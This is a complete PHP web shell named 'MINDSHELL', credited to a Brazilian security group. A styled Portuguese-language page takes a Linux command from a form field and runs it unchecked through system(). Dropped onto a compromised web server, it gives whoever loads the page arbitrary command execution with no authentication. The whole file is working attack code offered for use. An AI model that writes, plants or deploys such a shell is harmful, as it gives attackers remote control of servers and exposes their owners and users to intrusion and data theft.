<!--Coded by jord@root-Exploit  - Sr.Storm
and MINDSET-INFOSEC
--------------------------------------------
https://mindsetsecurity.wordpress.com
--------------------------------------------
versão completa em sairá em 2019 com mais funções
e muito mais complexa 

-->
<!DOCTYPE html>
<html>
<head>
	<title>◉|MINDSHELL|◉</title>
	<meta charset="utf-8">
	<link rel="shortcut icon" href="https://png.pngtree.com/svg/20160620/prompt_594302.png" type="image/png">
	<link href="https://fonts.googleapis.com/css?family=Major+Mono+Display" rel="stylesheet"> 
		<style> 
		h1 {font-family: 'Major Mono Display', monospace; color:red;}
		h3{font-family: 'Major Mono Display', monospace;}
		h4{font-family: 'Major Mono Display', monospace; color:white;}
	   input {type:text;background:rgba(0,0,.2);width: 280px;color:#ff23c4;}
		body, input {font: 11px sans regular,sans-serif;}
		body {color: #fff;text-align: center;background: #333 url(bg.png);}
		pre{font-family: sans-serif; color:#ffff2e;}
		a{color:#7fff00;}
	</style>
</head>
<body>
<center>
	<center><h1>&#9763; Bem Vindo Ao Mindshell &#9763;</h1>
<h4>visite nosso blog <a href="https://mindsetsecurity.wordpress.com/"><br>◉|MindsetSec|◉</a></h4><br>
<img src="https://mindsetsecurity.files.wordpress.com/2018/02/cropped-1f43a.png?w=150">
<font color="silver"><h3>&#8623;Command&#8623;</h3></font>
<form method="GET" name="linha de comando">
<input type="text" name="cmd" placeholder="&#9997;Digite aqui um comando linux!">
<br>
<input type="submit" name="env" value="exec"></br>
 <pre>
&#9762;--------------------------------------------------------------------&#9762;
<?php

	if($_GET['cmd']) {
 	system($_GET['cmd']);
  }

 ?>
 &#9762;--------------------------------------------------------------------&#9762;
 </pre>
</table>
</form>
</center>
</body>
</html>
